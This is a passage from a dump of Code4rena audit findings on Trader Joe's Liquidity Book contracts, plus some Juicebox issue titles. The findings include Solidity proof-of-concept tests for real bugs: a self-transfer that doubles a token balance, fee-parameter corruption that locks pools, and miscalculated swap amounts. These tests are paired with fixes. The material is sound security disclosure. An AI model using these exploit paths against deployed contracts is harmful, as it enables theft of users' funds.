https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841     amountOut = _amountsIn[i + 1];     ```     So after calling `IJoePair(_pair).swap()`, the user just gets exactly `amountOut` and wastes a lot of tokenIn that (s)he transfers to the pool.    ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4  You can place this file into `/test` folder and run it using  ```bash= forge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv ```  Explanation of test script: (For more detail u can read the comments from test script above) 1. Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory. 2. At the forked block, price `WAVAX/USDC` was around 15.57. We try to use LBRouter function `swapTokensForExactTokens` to swap 10$ WAVAX (10e18 wei) to 1$ USDC (1e6 wei). But it reverts with the error `LBRouter__MaxAmountInExceeded`. But when we swap directly to JoePair, it swap successfully 10$ AVAX (10e18 wei) to 155$ USDC (155e6 wei). 3. We use LBRouter function `swapTokensForExactTokens` again with very large `amountInMax` to swap 1$ USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).  ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBRouter._getAmountsIn` as follow ```solidity= // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L717-L728 if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     // Fix here      amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / ((_reserveOut - amountOut_) * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` "}, {"title": "Wrong implementation of function `LBPair.setFeeParameter` can break the funcionality of LBPair and make user's tokens locked ", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-03"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917   # Vulnerability details  ## Vulnerable detail  Struct `FeeParameters` contains 12 fields as follows:  ```solidity= struct FeeParameters {     // 144 lowest bits in slot      uint16 binStep;     uint16 baseFactor;     uint16 filterPeriod;      uint16 decayPeriod;      uint16 reductionFactor;      uint24 variableFeeControl;     uint16 protocolShare;     uint24 maxVolatilityAccumulated;           // 112 highest bits in slot      uint24 volatilityAccumulated;     uint24 volatilityReference;     uint24 indexRef;     uint40 time;  } ``` Function [`LBPair.setFeeParamters(bytes _packedFeeParamters)`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790) is used to set the first 8 fields which was stored in 144 lowest bits of `LBPair._feeParameter`'s slot to 144 lowest bits of `_packedFeeParameters` (The layout of `_packedFeeParameters` can be seen [here](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584)). ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917  /// @notice Internal function to set the fee parameters of the pair /// @param _packedFeeParameters The packed fee parameters function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }      /// [#explain]  it will get 112 highest bits of feeStorageSlot,     ///             and stores it in the 112 lowest bits of _varParameters      uint256 _varParameters          = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);      /// [#explain]  get 144 lowest bits of packedFeeParameters      ///             and stores it in the 144 lowest bits of _newFeeParameters       uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);      assembly {         // [$audit-high] wrong operation `or` here          //              Mitigate: or(_newFeeParameters, _varParameters << 144)             sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))     } } ``` As we can see in the implementation of `LBPair._setFeesParametes` above, it gets the 112 highest bits of `_feeStorageSlot` and stores it in the 112 lowest bits of `_varParameter`. Then it gets the 144 lowest bits of `packedFeeParameter` and stores it in the 144 lowest bits of `_newFeeParameters`.   Following the purpose of function `setFeeParameters`, the new `LBPair._feeParameters` should form as follow:  ``` // keep 112 highest bits remain unchanged  // set 144 lowest bits to `_newFeeParameter` [...112 bits...][....144 bits.....] [_varParameters][_newFeeParameters] ``` It will make `feeParameters = _newFeeParameters | (_varParameters << 144)`. But current implementation just stores the `or` value of `_varParameters` and `_newFeeParameter` into `_feeParameters.slot`. It forgot to shift left the `_varParameters` 144 bits before executing `or` operation.   This will make the value of `binStep`, ..., `maxVolatilityAccumulated` incorrect, and also remove the value (make the bit equal to 0) of `volatilityAccumulated`, ..., `time`.  ## Impact * Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint) * Break the functionality of LBPair. The user can't swap/mint/flashLoan --> Make all the tokens stuck in the pools   ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769  You can place this file into `/test` folder and run it using  ```bash= forge test --match-contract High1Test -vv ```  Explanation of test script: 1. First we create a pair with `binStep = DEFAULT_BIN_STEP = 25` 2. We do some actions (add liquidity -> mint -> swap) to increase the value of `volatilityAccumulated` from `0` to `60000` 3. We call function `factory.setFeeParametersOnPair` to set new fee parameters.  4. After that the value of `volatilityAccumulated` changed to value `0` (It should still be unchanged after `factory.setFeeParametersOnPair`)  5. We check the value of `binStep` and it changed from`25` to `60025`      * `binStep` has that value because [line 915](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915) set `binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025`.  6. This change of `binStep` value will break all the functionality of `LBPair` cause `binStep > Constant.BASIS_POINT_MAX = 10000`  --> `Error: BinStepOverflows`    ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBPair._setFeesParaters` as follow:  ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917 function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }       uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);     uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);       assembly {         sstore(_feeParameters.slot, or(_newFeeParameters, shl(144, _varParameters)))     } } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/379", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-11"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Incorrect output amount calculation for Trader Joe V1 pools", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-02"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891 https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896   # Vulnerability details  ## Impact Output amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools. ## Proof of Concept [LBRouter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21) is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions: - [swapExactTokensForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531), which makes chained swaps (i.e. swaps between tokens that don't have a pair) of tokens implementing fee on transfer (i.e. there's fee reduced from every transferred amount); - [swapExactTokensForAVAXSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561), which is the variation of the above function which takes AVAX as the output token; - [swapExactAVAXForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594), which is the variation of the previous function which takes AVA as the input token.  Under the hood, these three functions call [_swapSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864), which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when `_binStep` is 0 (which is never true in V2 pools), it's assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools' reserves and balances: ```solidity if (_binStep == 0) {     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();     if (_token < _tokenNext) {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");     } else {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");     } } else {     ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient); } ``` However, these calculations are incorrect. Here's the difference: ```diff @@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();                      if (_token < _tokenNext) {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve0) * 997; +                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");                      } else {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve1) * 997; +                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");                      } ```  These calculations are implemented correctly in [JoeLibrary.getAmountOut](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41), which is used in [LBQuoter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83).  Also it's used in Trader Joe V1 to calculate output amounts in similar functions: - https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375  ```solidity // test/audit/RouterMath2.t.sol // SPDX-License-Identifier: UNLICENSED  pragma solidity ^0.8.7;  import \"../TestHelper.sol\";  import \"../../src/LBRouter.sol\"; import \"../../src/interfaces/IJoePair.sol\";  contract RouterMath2Test is TestHelper {     IERC20 internal token;     uint256 internal actualAmountOut;      function setUp() public {         token = new ERC20MockDecimals(18);         ERC20MockDecimals(address(token)).mint(address(this), 100e18);          router = new LBRouter(             ILBFactory(address(0x00)),             IJoeFactory(address(this)),             IWAVAX(address(0x02))         );     }      // Imitates V1 factory.     function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {         return address(this);     }      // Imitates V1 pool.     function getReserves() public pure returns (uint112, uint112, uint32) {         return (1e18, 1e18, 0);     }      // Imitates V1 pool.     function balanceOf(address /*acc*/) public pure returns (uint256) {         return 0.0001e18;     }      // Imitates V1 pool.     function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {         actualAmountOut = amount0 == 0 ? amount1 : amount0;     }      function testScenario() public {         // Setting up a swap via one V1 pool.         uint256[] memory steps = new uint256[](1);         steps[0] = 0;          IERC20[] memory path = new IERC20[](2);         path[0] = IERC20(address(token));         path[1] = IERC20(address(this));          uint256 amountIn = 0.0001e18;          token.approve(address(router), 1e18);         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(             amountIn, 0, steps, path, address(this), block.timestamp + 1000         );         // This amount was calculated incorrectly.         assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.           address _pair = address(this);         uint256 expectedAmountOut;          // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:         // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899         (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();         if (address(token) < address(this)) {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve0, _reserve0, _reserve1);         } else {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve1, _reserve1, _reserve0);         }          // This is the correct amount.         assertEq(expectedAmountOut, 989970211528238869);          // The wrong amount is smaller than the expected one.         assertEq(expectedAmountOut - actualAmountOut, 2940211528238869);     } } ``` ## Tools Used Manual review. ## Recommended Mitigation Steps Consider using the `JoeLibrary.getAmountOut` function in the `_swapSupportingFeeOnTransferTokens` function of `LBRouter` when computing output amounts for V1 pools."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/342", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-08"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "grade-a", "selected for report", "Q-07"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/326", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "grade-b", "G-10"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/325", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-06"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/303", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-09"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Transfering funds to yourself increases your balance", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-01"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192   # Vulnerability details  ## Impact Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:  ```solidity File: LBToken.sol 176:     function _transfer( 177:         address _from, 178:         address _to, 179:         uint256 _id, 180:         uint256 _amount 181:     ) internal virtual { 182:         uint256 _fromBalance = _balances[_id][_from]; ... 187:         uint256 _toBalance = _balances[_id][_to]; 188:  189:         unchecked { 190:             _balances[_id][_from] = _fromBalance - _amount; 191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt 192:         } .. 196:     } ```  Furthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :  ```solidity File: LBToken.sol 32:     modifier checkApproval(address _from, address _spender) { 33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender); 34:         _; 35:     } ... 131:     function safeTransferFrom( ... 136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) { ... 269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) { 270:         return _owner == _spender || _spenderApprovals[_owner][_spender]; 271:     } ```  ## Proof of Concept Add the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):  ```solidity     function testSafeTransferFromOneself() public {         uint256 amountIn = 1e18;          (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);          uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);          assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding          pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself         uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance         assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one         assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding     } ```  As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.  ## Recommended Mitigation Steps - Add checks to make sure that `_from != _to` because that shouldn't be useful anyway - Prefer the following:  ```solidity File: LBToken.sol 189:         unchecked { 190:             _balances[_id][_from] -= _amount; 191:             _balances[_id][_to] += _amount; 192:         } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-08"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/280", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "grade-b", "Q-05"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "grade-a", "selected for report", "G-07"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/190", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-06"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "grade-a", "Q-04"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/177", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-03"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/162", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-05"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/153", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-02"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-01"], "target": "2022-10-traderjoe-findings", "body": "QA Report"}, {"title": "Very critical `Owner` privileges can cause complete destruction of the project in a possible privateKey exploit", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor acknowledged", "selected for report", "M-04"], "target": "2022-10-traderjoe-findings", "body": "Very critical `Owner` privileges can cause complete destruction of the project in a possible privateKey exploit"}, {"title": "Flashloan fee collection mechanism can be easily manipulated", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor acknowledged", "edited-by-warden", "selected for report", "M-03"], "target": "2022-10-traderjoe-findings", "body": "Flashloan fee collection mechanism can be easily manipulated"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-04"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "beforeTokenTransfer called with wrong parameters in LBToken._burn", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "M-02"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/37258d595d596c195507234f795fa34e319b0a68/src/LBToken.sol#L237   # Vulnerability details  ## Impact In `LBToken._burn`, the `_beforeTokenTransfer` hook is called with `from = address(0)` and `to = _account`: ```solidity _beforeTokenTransfer(address(0), _account, _id, _amount); ``` Through a lucky coincidence, it turns out that this in the current setup does not cause a high severity issue. `_burn` is always called with `_account = address(this)`, which means that `LBPair._beforeTokenTransfer` is a NOP. However, this wrong call is very dangerous for future extensions or protocol that built on top of the protocol / fork it.  ## Proof Of Concept Let's say the protocol is extended with some logic that needs to track mints / burns. The canonical way to do this would be: ```solidity function _beforeTokenTransfer(         address _from,         address _to,         uint256 _id,         uint256 _amount     ) internal override(LBToken) {  if (_from == address(0)) {   // Mint Logic  } else if (_to == address(0)) {   // Burn Logic  } } ``` Such an extension would break, which could lead to loss of funds or a bricked system.  ## Recommended Mitigation Steps Call the hook correctly: ```solidity _beforeTokenTransfer(_account, address(0), _id, _amount); ```"}, {"title": "LBRouter.removeLiquidity returning wrong values", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "M-01"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/e81b78ddb7cc17f0ece921fbaef2c2521727094b/src/LBRouter.sol#L291   # Vulnerability details  ## Impact `LBRouter.removeLiquidity` reorders tokens when the user did not pass them in the pair order (ascending order): ```solidity if (_tokenX != _LBPair.tokenX()) {             (_tokenX, _tokenY) = (_tokenY, _tokenX);             (_amountXMin, _amountYMin) = (_amountYMin, _amountXMin); } ``` However, when returning `amountX` and `amountY`, it is ignored if the order was changed: ```solidity (amountX, amountY) = _removeLiquidity(_LBPair, _amountXMin, _amountYMin, _ids, _amounts, _to); ``` Therefore, when the order of the tokens is swapped by the function, the return value `amountX` (\"Amount of token X returned\") in reality is the amount of the user-provided token Y that is returned and vice versa.  Because this is an exposed function that third-party protocols / contracts will use, this can cause them to malfunction. For instance, when integrating with Trader Joe, something natural to do is: ``` (uint256 amountAReceived, uint256 amountBReceived) = LBRouter.removeLiquidity(address(tokenA), address(tokenB), ...); contractBalanceA += amountAReceived; contractBalanceB += amountBReceived; ``` This snippet will only be correct when the token addresses are passed in the right order, which should not be the case. When they are not passed in the right order, the accounting of third-party contracts will be messed up, leading to vulnerabilities / lost funds there.  ## Proof Of Concept First consider the following diff, which shows a scenario when `LBRouter` does not switch `tokenX` and `tokenY`, resulting in correct return values: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,7 +57,9 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token6D,              token18D,              DEFAULT_BIN_STEP, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountFirstRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountSecondRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test passes (as it should). Now, consider the following diff, where `LBRouter` switches `tokenX` and `tokenY`: ```diff --- a/test/LBRouter.Liquidity.t.sol +++ b/test/LBRouter.Liquidity.t.sol @@ -57,12 +57,14 @@ contract LiquidityBinRouterTest is TestHelper {            pair.setApprovalForAll(address(router), true);   -        router.removeLiquidity( -            token6D, +        uint256 token6BalBef = token6D.balanceOf(DEV); +        uint256 token18BalBef = token18D.balanceOf(DEV); +        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(              token18D, +            token6D,              DEFAULT_BIN_STEP, -            totalXbalance,              totalYBalance, +            totalXbalance,              ids,              amounts,              DEV, @@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {          );            assertEq(token6D.balanceOf(DEV), amountXIn); +        assertEq(amountXIn, token6BalBef + amountSecondRet);          assertEq(token18D.balanceOf(DEV), _amountYIn); +        assertEq(_amountYIn, token18BalBef + amountFirstRet);      }        function testRemoveLiquidityReverseOrder() public { ``` This test should also pass (the order of the tokens was only switched), but it does not because the return values are mixed up.  ## Recommended Mitigation Steps Add the following statement in the end: ```solidity if (_tokenX != _LBPair.tokenX()) {  return (amountY, amountX); } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-03"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/24", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-02"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-01"], "target": "2022-10-traderjoe-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/1", "labels": [], "target": "2022-10-traderjoe-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/230", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-34"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/229", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-49"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "A user can delegate his tire voting to a zero address", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/228", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor disputed", "grade-b", "Q-48"], "target": "2022-10-juicebox-findings", "body": "A user can delegate his tire voting to a zero address"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/227", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-47"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/224", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-33"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/223", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-32"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/221", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-31"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/220", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "grade-a", "Q-46"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "JBTiered721Delegate.tokenURI() is not compliant with EIP721", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/218", "labels": ["bug", "documentation", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "grade-a", "Q-45"], "target": "2022-10-juicebox-findings", "body": "JBTiered721Delegate.tokenURI() is not compliant with EIP721"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/217", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-44"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/209", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-43"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/205", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-42"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "The tier reserved rate is not validated and can surpass `JBConstants.MAX_RESERVED_RATE`", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/201", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "satisfactory", "selected for report", "M-08"], "target": 